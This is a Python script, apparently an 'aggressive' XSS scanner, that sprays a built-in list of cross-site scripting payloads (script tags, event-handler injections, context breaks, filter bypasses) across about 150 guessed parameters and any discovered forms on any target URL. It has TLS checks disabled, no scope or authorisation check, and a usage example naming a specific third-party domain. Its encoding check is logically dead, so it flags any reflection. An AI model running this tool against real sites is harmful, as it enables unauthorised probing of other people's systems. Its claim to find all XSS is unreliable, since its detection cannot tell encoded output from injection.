#!/usr/bin/env python3
"""
Aggressive XSS Scanner v6.0 - Finds ALL XSS
Author: ttiimmaa123
Ultra-aggressive detection - Reports all potential XSS for manual verification
"""

import sys
import requests
import threading
import time
import argparse
import re
import html
from urllib.parse import quote_plus, unquote, urlparse, urljoin
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AggressiveXSSScanner:
    def __init__(self, threads=5, timeout=10):
        self.threads = threads
        self.timeout = timeout
        self.potential_vulns = []
        self.tested_count = 0
        self.found_forms = []
        self.found_endpoints = []
        self.lock = threading.Lock()
        
        # Session
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        
        # ULTRA AGGRESSIVE payloads
        self.aggressive_payloads = [
            # Simple reflection tests
            "XSSTEST123",
            "testXSS", 
            "XSS_REFLECTION_TEST",
            
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            
            # Image/SVG
            "<img src=x onerror=alert('XSS')>",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload=alert('XSS')>",
            "<svg/onload=alert(1)>",
            
            # Events
            "<input onmouseover=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>",
            
            # Context breaking
            "'><script>alert('XSS')</script>",
            '"><script>alert("XSS")</script>',
            "</title><script>alert('XSS')</script>",
            "</textarea><script>alert('XSS')</script>",
            
            # JavaScript URLs
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Simple HTML
            "<h1>XSS_TEST</h1>",
            "<marquee>XSS_TEST</marquee>",
            
            # Characters that reveal reflection
            "<",
            ">",
            "\"",
            "'",
            
            # Filter bypasses
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
        ]
        
        # MASSIVE parameter list
        self.massive_params = [
            'q', 'search', 'query', 'keyword', 'term', 'find', 'keywords', 's', 'searchterm',
            'name', 'username', 'user', 'email', 'message', 'comment', 'text', 'content',
            'id', 'value', 'data', 'input', 'body', 'description', 'title', 'subject',
            'fname', 'lname', 'firstname', 'lastname', 'fullname', 'displayname',
            'address', 'city', 'state', 'country', 'phone', 'mobile', 'website',
            'company', 'organization', 'department', 'position', 'role', 'job',
            'contact', 'feedback', 'inquiry', 'request', 'support', 'help',
            'question', 'issue', 'problem', 'bug', 'report', 'submit',
            'callback', 'jsonp', 'api', 'ajax', 'action', 'method', 'function',
            'page', 'view', 'mode', 'type', 'category', 'tag', 'filter',
            'url', 'link', 'href', 'src', 'redirect', 'return', 'goto', 'next',
            'debug', 'test', 'demo', 'example', 'sample', 'trace', 'log',
            'error', 'exception', 'output', 'result', 'response', 'status',
            'lang', 'language', 'locale', 'charset', 'encoding', 'format',
            'theme', 'skin', 'template', 'layout', 'style', 'css',
            'ref', 'referer', 'referrer', 'from', 'source', 'origin',
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'r', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
        ]
    
    def normalize_url(self, target):
        if not target.startswith(('http://', 'https://')):
            return f'https://{target}'
        return target
    
    def test_connectivity(self, url):
        try:
            response = self.session.get(url, timeout=self.timeout)
            return True, response.status_code, url, response
        except requests.exceptions.SSLError:
            http_url = url.replace('https://', 'http://')
            try:
                response = self.session.get(http_url, timeout=self.timeout)
                return True, response.status_code, http_url, response
            except:
                return False, None, None, None
        except Exception:
            return False, None, None, None
    
    def discover_forms(self, url, response_text):
        try:
            form_pattern = r'<form[^>]*?(?:action=["\']?([^"\'>\s]*)["\']?)?[^>]*?>(.*?)</form>'
            input_pattern = r'<(?:input|textarea)[^>]*?name=["\']?([^"\'>\s]+)["\']?'
            
            forms = re.findall(form_pattern, response_text, re.IGNORECASE | re.DOTALL)
            
            for action, form_content in forms:
                form_url = urljoin(url, action) if action else url
                
                inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
                inputs = [inp for inp in inputs if inp]
                
                if inputs:
                    self.found_forms.append({
                        'url': form_url,
                        'method': 'POST',
                        'inputs': inputs
                    })
                    print(f"    📝 Found form: {form_url} with {len(inputs)} inputs")
        except Exception:
            pass
    
    def ultra_aggressive_detection(self, response_text, payload):
        """ULTRA AGGRESSIVE - Reports almost ANY reflection"""
        
        # If payload appears ANYWHERE, flag it
        if payload in response_text:
            
            # Only skip if completely HTML encoded
            html_encoded = html.escape(payload)
            if html_encoded in response_text and payload not in response_text:
                return False, "Completely HTML encoded"
            
            # Otherwise, flag as potential
            if any(char in payload for char in ['<', '>', '"', "'", 'script', 'alert']):
                return True, "🚨 POTENTIAL XSS - Dangerous payload reflected!"
            else:
                return True, "🟡 REFLECTION DETECTED - May indicate XSS potential"
        
        return False, "Payload not reflected"
    
    def test_aggressive_xss(self, base_url, param, payload, method='GET'):
        try:
            if method.upper() == 'GET':
                encoded_payload = quote_plus(payload)
                test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}={encoded_payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                display_url = test_url
            else:
                data = {param: payload}
                response = self.session.post(base_url, data=data, timeout=self.timeout)
                display_url = base_url
            
            # ULTRA AGGRESSIVE detection
            is_potential, analysis = self.ultra_aggressive_detection(response.text, payload)
            
            if is_potential:
                confidence = "High" if "🚨" in analysis else "Medium"
                
                vulnerability = {
                    'type': f'{method.upper()} Parameter XSS',
                    'url': display_url,
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'analysis': analysis,
                    'confidence': confidence
                }
                
                with self.lock:
                    self.potential_vulns.append(vulnerability)
                    icon = "🚨" if confidence == "High" else "🟡"
                    print(f"    {icon} POTENTIAL: {param} ({method}) - {analysis}")
                    print(f"        Payload: {payload[:40]}...")
                
                return True
        except Exception:
            pass
        return False
    
    def test_form_aggressive(self, form_data):
        print(f"    🔍 Testing form: {form_data['url']}")
        
        for payload in self.aggressive_payloads[:5]:
            for input_name in form_data['inputs'][:3]:  # Test first 3 inputs
                try:
                    form_data_dict = {inp: payload if inp == input_name else 'test' for inp in form_data['inputs']}
                    
                    response = self.session.post(form_data['url'], data=form_data_dict, timeout=self.timeout)
                    
                    is_potential, analysis = self.ultra_aggressive_detection(response.text, payload)
                    
                    if is_potential:
                        self.potential_vulns.append({
                            'type': 'Form XSS',
                            'url': form_data['url'],
                            'parameter': input_name,
                            'payload': payload,
                            'analysis': analysis,
                            'confidence': 'High'
                        })
                        print(f"        🚨 FORM POTENTIAL: {input_name} - {analysis}")
                
                except Exception:
                    continue
    
    def run_aggressive_scan(self, target):
        url = self.normalize_url(target)
        
        print("=" * 80)
        print("🔥 AGGRESSIVE XSS SCANNER v6.0 - FINDS ALL XSS")
        print("=" * 80)
        print("⚡ Ultra-aggressive detection - Reports ALL potential XSS")
        print("🎯 Designed to find XSS other scanners miss")
        print("⚠️  Will produce many findings - manual verification required")
        print("=" * 80)
        print(f"🎯 Target: {target}")
        print("-" * 80)
        
        # Connectivity
        print("[+] Testing connectivity...")
        reachable, status, final_url, response = self.test_connectivity(url)
        
        if not reachable:
            print("[!] ❌ Target unreachable!")
            return []
        
        url = final_url
        print(f"[+] ✅ Target reachable! (Status: {status})")
        
        # Discover
        print("[+] Discovering forms...")
        self.discover_forms(url, response.text)
        print(f"[+] Found {len(self.found_forms)} forms")
        
        # Aggressive testing
        print("[+] 🔥 ULTRA-AGGRESSIVE PARAMETER TESTING...")
        print(f"[+] Testing {len(self.massive_params)} params with {len(self.aggressive_payloads)} payloads")
        
        test_count = 0
        total_tests = len(self.massive_params) * len(self.aggressive_payloads)
        
        for param in self.massive_params:
            for payload in self.aggressive_payloads:
                test_count += 1
                if test_count % 50 == 0:
                    progress = (test_count / total_tests) * 100
                    print(f"[+] Progress: {test_count}/{total_tests} ({progress:.1f}%)")
                
                # Test GET and POST
                self.test_aggressive_xss(url, param, payload, 'GET')
                self.test_aggressive_xss(url, param, payload, 'POST')
        
        # Form testing
        if self.found_forms:
            print("[+] 🔥 AGGRESSIVE FORM TESTING...")
            for form in self.found_forms:
                self.test_form_aggressive(form)
        
        # Report
        self.generate_aggressive_report(target)
        return self.potential_vulns
    
    def generate_aggressive_report(self, target):
        print("\n" + "=" * 80)
        print("🔥 AGGRESSIVE XSS SCAN RESULTS")
        print("=" * 80)
        print(f"🎯 Target: {target}")
        print(f"🕒 Completed: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 80)
        
        if self.potential_vulns:
            print(f"🚨 POTENTIAL XSS FINDINGS: {len(self.potential_vulns)}")
            print("⚠️  ALL REQUIRE MANUAL VERIFICATION!")
            
            high_conf = [v for v in self.potential_vulns if v.get('confidence') == 'High']
            medium_conf = [v for v in self.potential_vulns if v.get('confidence') == 'Medium']
            
            print(f"🚨 High Priority: {len(high_conf)}")
            print(f"🟡 Medium Priority: {len(medium_conf)}")
            print("-" * 80)
            
            # Show findings
            for i, vuln in enumerate(self.potential_vulns[:15], 1):
                icon = "🚨" if vuln.get('confidence') == 'High' else "🟡"
                print(f"\n[{i}] {icon} {vuln['type']} - {vuln.get('confidence', 'Unknown')}")
                print(f"    Parameter: {vuln.get('parameter', 'N/A')}")
                print(f"    Payload: {vuln['payload']}")
                print(f"    Analysis: {vuln.get('analysis', 'N/A')}")
                print(f"    URL: {vuln['url'][:100]}...")
                print(f"    🧪 MANUAL TEST: Copy URL to browser and check execution")
            
            if len(self.potential_vulns) > 15:
                print(f"\n... and {len(self.potential_vulns) - 15} more findings")
            
            print(f"\n🔍 MANUAL VERIFICATION:")
            print(f"   1. Copy URLs to browser")
            print(f"   2. Look for alert/prompt boxes")
            print(f"   3. Check if HTML renders")
            print(f"   4. Inspect page source")
            
            print(f"\n⚠️  IMPORTANT:")
            print(f"   • This scanner reports ALL reflection")
            print(f"   • Many may be false positives")
            print(f"   • Manual testing required")
            
        else:
            print(f"🤔 NO POTENTIAL XSS FOUND")
            print(f"This is unusual for aggressive scanning")
            print(f"Target may have very strong protection")
        
        print("\n" + "=" * 80)
        print("🔥 AGGRESSIVE SCAN COMPLETED")
        print("🎯 Manual verification required for all findings")
        print("=" * 80)

def main():
    print("\n🔥 AGGRESSIVE XSS SCANNER v6.0")
    print("Ultra-Aggressive Detection - Reports All Potential XSS")
    print("Author: ttiimmaa123")
    print("━" * 60)
    print("⚡ Reports ALL potential reflection")
    print("🎯 Finds XSS other scanners miss")
    print("⚠️  May produce false positives")
    print("🔍 Manual verification required")
    print("━" * 60)
    
    parser = argparse.ArgumentParser(description='Aggressive XSS Scanner')
    parser.add_argument('target', help='Target to scan')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout (default: 10)')
    
    if len(sys.argv) == 1:
        parser.print_help()
        print("\nExamples:")
        print("  python3 xss_scanner.py http://support.crestfield.com")
        print("  python3 xss_scanner.py https://target.com")
        sys.exit(0)
    
    args = parser.parse_args()
    scanner = AggressiveXSSScanner(timeout=args.timeout)
    
    try:
        findings = scanner.run_aggressive_scan(args.target)
        
        if findings:
            high_conf = [v for v in findings if v.get('confidence') == 'High']
            print(f"\n🔥 FOUND {len(findings)} POTENTIAL XSS!")
            print(f"🚨 {len(high_conf)} high priority findings")
            sys.exit(1)
        else:
            print(f"\n🤔 No potential XSS found")
            sys.exit(0)
    
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(2)
    except Exception as error:
        print(f"\n[!] Error: {error}")
        sys.exit(3)

if __name__ == '__main__':
    main()
